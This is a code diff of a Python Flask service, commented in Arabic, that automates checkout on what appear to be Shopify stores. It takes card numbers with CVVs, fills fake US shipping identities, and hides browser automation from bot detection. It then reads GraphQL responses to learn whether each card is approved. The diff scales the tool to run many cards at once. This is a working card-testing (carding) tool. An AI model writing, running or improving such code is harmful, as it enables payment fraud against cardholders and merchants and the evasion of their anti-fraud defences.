@@ -1,4 +1,4 @@
-# app.py - ملف API عالي الأداء مع undetected-chromedriver - دعم أي إصدار Chrome
+# app.py - ملف API عالي الأداء مع دعم الطلبات المتعددة + undetected-chromedriver
 import time
 import re
 import json
@@ -17,51 +17,35 @@ import queue
 from concurrent.futures import ThreadPoolExecutor, as_completed
 import logging
 import random
-import subprocess
+import psutil
+import gc
 
 app = Flask(__name__)
 
-# ==================== إعدادات الأداء ====================
-MAX_WORKERS = 5
-REQUEST_TIMEOUT = 90
+# ==================== إعدادات الأداء للسيرفر القوي ====================
+# حساب عدد العمال حسب الرامات المتوفرة
+total_ram_gb = psutil.virtual_memory().total / (1024**3)
+cpu_count = os.cpu_count() or 4
+
+# كل متصفح يستهلك تقريباً 500MB-1GB رام
+# نخلي عدد العمال = نصف عدد الأنوية أو حسب الرام
+MAX_WORKERS = min(cpu_count * 2, int(total_ram_gb / 1.5))
+MAX_WORKERS = max(MAX_WORKERS, 5)  # الحد الأدنى 5
+MAX_WORKERS = min(MAX_WORKERS, 20)  # الحد الأقصى 20
+
+REQUEST_TIMEOUT = 120
 TASK_QUEUE = queue.Queue()
 executor = ThreadPoolExecutor(max_workers=MAX_WORKERS)
 
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
 
+# تتبع المهام والموارد
 active_tasks = {}
 active_tasks_lock = threading.Lock()
+driver_semaphore = threading.Semaphore(MAX_WORKERS)  # حد أقصى للمتصفحات المفتوحة بنفس الوقت
 
-# ==================== كشف إصدار Chrome تلقائياً ====================
-def get_chrome_version():
-    """الحصول على إصدار Chrome الرئيسي تلقائياً"""
-    try:
-        result = subprocess.run(['google-chrome', '--version'], capture_output=True, text=True)
-        version_str = result.stdout.strip()
-        match = re.search(r'(\d+)\.', version_str)
-        if match:
-            version = int(match.group(1))
-            logger.info(f"Detected Chrome version: {version}")
-            return version
-    except:
-        pass
-    
-    try:
-        result = subprocess.run(['chromium', '--version'], capture_output=True, text=True)
-        version_str = result.stdout.strip()
-        match = re.search(r'(\d+)\.', version_str)
-        if match:
-            version = int(match.group(1))
-            logger.info(f"Detected Chromium version: {version}")
-            return version
-    except:
-        pass
-    
-    logger.warning("Could not detect Chrome version, using default")
-    return None
-
-CHROME_VERSION = get_chrome_version()
+logger.info(f"Server config: RAM={total_ram_gb:.1f}GB, CPU={cpu_count} cores, MAX_WORKERS={MAX_WORKERS}")
 
 # ==================== نظام توليد عناوين أمريكية متطابقة ====================
 MATCHED_ADDRESSES = [
@@ -168,14 +152,18 @@ MATCHED_ADDRESSES = [
 ]
 
 def generate_matched_shipping_data():
-    """توليد بيانات شحن أمريكية متطابقة بالكامل"""
+    """
+    توليد بيانات شحن أمريكية متطابقة بالكامل
+    """
     address = random.choice(MATCHED_ADDRESSES).copy()
     username = f"{address['first_name'].lower()}{address['last_name'].lower()}{random.randint(1, 999)}"
     address["email"] = f"{username}@{address['email_domain']}"
     return address
 
 def extract_code_underscore_priority(all_codes, all_typenames, excluded_codes):
-    """طريقة استخراج - تعطي أولوية للـ codes التي تحتوي على شرطة سفلية _"""
+    """
+    طريقة استخراج - تعطي أولوية للـ codes التي تحتوي على شرطة سفلية _
+    """
     
     valid_codes = []
     for code in all_codes:
@@ -233,20 +221,27 @@ def extract_code_underscore_priority(all_codes, all_typenames, excluded_codes):
     return None, None
 
 def human_type(element, text, driver):
-    """كتابة النص حرف حرف بطريقة بشرية مع تأخيرات عشوائية"""
-    element.click()
-    time.sleep(random.uniform(0.1, 0.3))
-    element.clear()
-    time.sleep(random.uniform(0.05, 0.15))
-    
-    for char in text:
-        element.send_keys(char)
-        time.sleep(random.uniform(0.03, 0.12))
-    
-    time.sleep(random.uniform(0.1, 0.3))
+    """
+    كتابة النص حرف حرف بطريقة بشرية مع تأخيرات عشوائية
+    """
+    try:
+        element.click()
+        time.sleep(random.uniform(0.1, 0.3))
+        element.clear()
+        time.sleep(random.uniform(0.05, 0.15))
+        
+        for char in text:
+            element.send_keys(char)
+            time.sleep(random.uniform(0.02, 0.08))
+        
+        time.sleep(random.uniform(0.1, 0.3))
+    except:
+        pass
 
 def human_mouse_move(driver, element):
-    """تحريك الماوس بشكل عشوائي نحو العنصر"""
+    """
+    تحريك الماوس بشكل عشوائي نحو العنصر
+    """
     try:
         actions = ActionChains(driver)
         for _ in range(random.randint(1, 3)):
@@ -262,29 +257,73 @@ def human_mouse_move(driver, element):
         pass
 
 def random_scroll(driver):
-    """تمرير عشوائي للصفحة لمحاكاة السلوك البشري"""
+    """
+    تمرير عشوائي للصفحة لمحاكاة السلوك البشري
+    """
     try:
         total_height = driver.execute_script("return document.body.scrollHeight")
         scroll_points = random.randint(1, 3)
         for _ in range(scroll_points):
-            scroll_to = random.randint(100, total_height - 100)
+            scroll_to = random.randint(100, max(200, total_height - 100))
             driver.execute_script(f"window.scrollTo({{top: {scroll_to}, behavior: 'smooth'}});")
             time.sleep(random.uniform(0.3, 0.8))
     except:
         pass
 
+def get_chrome_major_version():
+    """
+    جلب إصدار Chrome الرئيسي المثبت على السيرفر
+    """
+    try:
+        import subprocess
+        result = subprocess.run(['google-chrome', '--version'], capture_output=True, text=True)
+        version_str = result.stdout.strip()
+        match = re.search(r'(\d+)\.', version_str)
+        if match:
+            return int(match.group(1))
+    except:
+        pass
+    
+    try:
+        result = subprocess.run(['chromium', '--version'], capture_output=True, text=True)
+        version_str = result.stdout.strip()
+        match = re.search(r'(\d+)\.', version_str)
+        if match:
+            return int(match.group(1))
+    except:
+        pass
+    
+    try:
+        result = subprocess.run(['chromium-browser', '--version'], capture_output=True, text=True)
+        version_str = result.stdout.strip()
+        match = re.search(r'(\d+)\.', version_str)
+        if match:
+            return int(match.group(1))
+    except:
+        pass
+    
+    return None
+
 def ff(ccx, site, task_id=None):
-    """دالة معالجة بطاقة واحدة وموقع واحد - تستخدم undetected-chromedriver"""
+    """
+    دالة معالجة بطاقة واحدة وموقع واحد - تستخدم undetected-chromedriver
+    """
     
     if task_id:
         with active_tasks_lock:
             active_tasks[task_id] = {"status": "running", "started": time.time(), "cc": ccx, "site": site}
         logger.info(f"[{task_id}] Started task: {site}")
     
+    # انتظار توفر مورد للمتصفح
+    acquired = driver_semaphore.acquire(timeout=30)
+    if not acquired:
+        return {"success": False, "code": None, "error": "Server busy, max drivers reached", "task_id": task_id}
+    
     shipping_data = generate_matched_shipping_data()
     
     parts = ccx.split('|')
     if len(parts) != 4:
+        driver_semaphore.release()
         return {"success": False, "code": None, "error": "Invalid card format", "task_id": task_id}
     
     card_data = {
@@ -321,8 +360,9 @@ def ff(ccx, site, task_id=None):
             'service', 'guarantee', 'support'
         ]
         
-        r = s.get(urljoin(site, '/products.json?limit=250'), proxies=proxies, timeout=10)
+        r = s.get(urljoin(site, '/products.json?limit=250'), proxies=proxies, timeout=15)
         if r.status_code != 200:
+            driver_semaphore.release()
             return {"success": False, "code": None, "error": "Failed to fetch products", "task_id": task_id}
         
         products_data = r.json()
@@ -354,23 +394,26 @@ def ff(ccx, site, task_id=None):
                     })
         
         if not shippable_products:
+            driver_semaphore.release()
             return {"success": False, "code": None, "error": "No shippable product", "task_id": task_id}
         
         cheapest = min(shippable_products, key=lambda x: x['price'])
         variant_id = cheapest['variant_id']
         total_amount = f"${cheapest['price']:.2f}"
         
-        resp = s.post(urljoin(site, '/cart/add.js'), json={'quantity': 1, 'id': variant_id}, proxies=proxies, cookies=s.cookies, timeout=10)
+        resp = s.post(urljoin(site, '/cart/add.js'), json={'quantity': 1, 'id': variant_id}, proxies=proxies, cookies=s.cookies, timeout=15)
         if resp.status_code != 200:
+            driver_semaphore.release()
             return {"success": False, "code": None, "error": "Failed to add to cart", "task_id": task_id}
         
-        response = s.post(f'{site}/cart', data={'checkout': ''}, proxies=proxies, cookies=s.cookies, timeout=10)
+        response = s.post(f'{site}/cart', data={'checkout': ''}, proxies=proxies, cookies=s.cookies, timeout=15)
         checkout_url = response.url
         
     except Exception as e:
+        driver_semaphore.release()
         return {"success": False, "code": None, "error": str(e), "task_id": task_id}
     
-    # ==================== 2. تشغيل المتصفح ====================
+    # ==================== 2. تشغيل المتصفح - undetected-chromedriver ====================
     driver = None
     try:
         options = uc.ChromeOptions()
@@ -387,19 +430,33 @@ def ff(ccx, site, task_id=None):
         options.add_argument('--disable-extensions')
         options.add_argument('--window-size=1920,1080')
         options.add_argument('--start-maximized')
+        options.add_argument('--disable-background-networking')
+        options.add_argument('--disable-sync')
+        options.add_argument('--disable-translate')
+        options.add_argument('--disable-default-apps')
+        options.add_argument('--mute-audio')
+        options.add_argument('--no-first-run')
+        options.add_argument('--no-default-browser-check')
+        options.add_argument('--single-process')
+        options.add_argument('--disable-ipc-flooding-protection')
+        options.add_argument(f'--memory-pressure-off')
         
-        # تحديد الإصدار تلقائياً أو تركه None ليتعامل تلقائياً
-        if CHROME_VERSION:
-            driver = uc.Chrome(options=options, version_main=CHROME_VERSION, use_subprocess=True)
+        # جلب إصدار Chrome المثبت تلقائياً
+        chrome_version = get_chrome_major_version()
+        
+        if chrome_version:
+            logger.info(f"[{task_id}] Using Chrome version: {chrome_version}")
+            driver = uc.Chrome(options=options, version_main=chrome_version, use_subprocess=True)
         else:
+            logger.info(f"[{task_id}] Auto-detecting Chrome version...")
             driver = uc.Chrome(options=options, use_subprocess=True)
         
-        # إخفاء إضافي
         driver.execute_script("""
             Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
             window.chrome = {runtime: {}};
             Object.defineProperty(navigator, 'plugins', {get: () => [1, 2, 3, 4, 5]});
             Object.defineProperty(navigator, 'languages', {get: () => ['en-US', 'en']});
+            
             const originalQuery = window.navigator.permissions.query;
             window.navigator.permissions.query = (parameters) => (
                 parameters.name === 'notifications' ?
@@ -417,7 +474,7 @@ def ff(ccx, site, task_id=None):
         random_scroll(driver)
         time.sleep(random.uniform(0.5, 1.5))
         
-        # ==================== 3. تعبئة الشحن ====================
+        # ==================== 3. تعبئة الشحن بطريقة بشرية ====================
         try:
             email_field = wait.until(EC.presence_of_element_located((By.ID, "email")))
             human_mouse_move(driver, email_field)
@@ -474,9 +531,10 @@ def ff(ccx, site, task_id=None):
             time.sleep(random.uniform(2, 4))
             
         except:
+            driver_semaphore.release()
             return {"success": False, "code": None, "error": "Shipping fill failed", "task_id": task_id}
         
-        # ==================== 4. تعبئة الدفع ====================
+        # ==================== 4. تعبئة الدفع بطريقة بشرية ====================
         try:
             driver.switch_to.default_content()
             time.sleep(random.uniform(0.5, 1.5))
@@ -533,9 +591,11 @@ def ff(ccx, site, task_id=None):
                     continue
             
             if not (card_filled and expiry_filled and cvv_filled and name_filled):
+                driver_semaphore.release()
                 return {"success": False, "code": None, "error": "Payment fill failed", "task_id": task_id}
             
         except:
+            driver_semaphore.release()
             return {"success": False, "code": None, "error": "Payment error", "task_id": task_id}
         
         # ==================== 5. اعتراض GraphQL ====================
@@ -1045,6 +1105,10 @@ def ff(ccx, site, task_id=None):
             
             if driver:
                 driver.quit()
+                driver = None
+                gc.collect()
+            
+            driver_semaphore.release()
             
             # ==================== نتيجة الاستخراج ====================
             if order_confirmed:
@@ -1113,7 +1177,15 @@ def ff(ccx, site, task_id=None):
         
         except Exception as e:
             if driver:
-                driver.quit()
+                try:
+                    driver.quit()
+                except:
+                    pass
+                driver = None
+                gc.collect()
+            
+            driver_semaphore.release()
+            
             if task_id:
                 with active_tasks_lock:
                     if task_id in active_tasks:
@@ -1134,7 +1206,15 @@ def ff(ccx, site, task_id=None):
     
     except Exception as e:
         if driver:
-            driver.quit()
+            try:
+                driver.quit()
+            except:
+                pass
+            driver = None
+            gc.collect()
+        
+        driver_semaphore.release()
+        
         if task_id:
             with active_tasks_lock:
                 if task_id in active_tasks:
@@ -1158,7 +1238,9 @@ def ff(ccx, site, task_id=None):
 def home():
     """
     نقطة النهاية الرئيسية
-    الاستخدام: /?cc=بطاقة|شهر|سنة|cvv&url=رابط_الموقع
+    
+    الاستخدام:
+    /?cc=بطاقة|شهر|سنة|cvv&url=رابط_الموقع
     """
     cc = request.args.get('cc')
     url = request.args.get('url')
@@ -1171,6 +1253,7 @@ def home():
         })
     
     task_id = f"task_{int(time.time()*1000)}_{random.randint(1000,9999)}"
+    
     future = executor.submit(ff, cc, url, task_id)
     
     try:
@@ -1187,24 +1270,40 @@ def home():
 @app.route('/status', methods=['GET'])
 def status():
     with active_tasks_lock:
-        return jsonify({
-            "active_tasks_count": len(active_tasks),
-            "max_workers": MAX_WORKERS,
-            "chrome_version": CHROME_VERSION,
-            "tasks": active_tasks
-        })
+        running = sum(1 for t in active_tasks.values() if t.get('status') == 'running')
+        completed = sum(1 for t in active_tasks.values() if t.get('status') == 'completed')
+        errors = sum(1 for t in active_tasks.values() if t.get('status') == 'error')
+    
+    # تنظيف المهام القديمة
+    with active_tasks_lock:
+        to_remove = [tid for tid, t in active_tasks.items() 
+                     if t.get('status') != 'running' and time.time() - t.get('started', 0) > 300]
+        for tid in to_remove:
+            del active_tasks[tid]
+    
+    return jsonify({
+        "active_tasks_count": len(active_tasks),
+        "running": running,
+        "completed": completed,
+        "errors": errors,
+        "max_workers": MAX_WORKERS,
+        "ram_gb": round(total_ram_gb, 1),
+        "cpu_count": cpu_count,
+        "ram_usage_percent": psutil.virtual_memory().percent
+    })
 
 @app.route('/health', methods=['GET'])
 def health():
     return jsonify({
         "status": "ok",
         "max_workers": MAX_WORKERS,
-        "chrome_version": CHROME_VERSION,
-        "active_tasks": len(active_tasks)
+        "active_tasks": len(active_tasks),
+        "ram_usage_percent": psutil.virtual_memory().percent,
+        "cpu_percent": psutil.cpu_percent(interval=1)
     })
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 8080))
     logger.info(f"Starting server on port {port}")
-    logger.info(f"Chrome version detected: {CHROME_VERSION}")
+    logger.info(f"RAM: {total_ram_gb:.1f}GB | CPU: {cpu_count} cores | Max Workers: {MAX_WORKERS}")
     app.run(host='0.0.0.0', port=port, threaded=True)
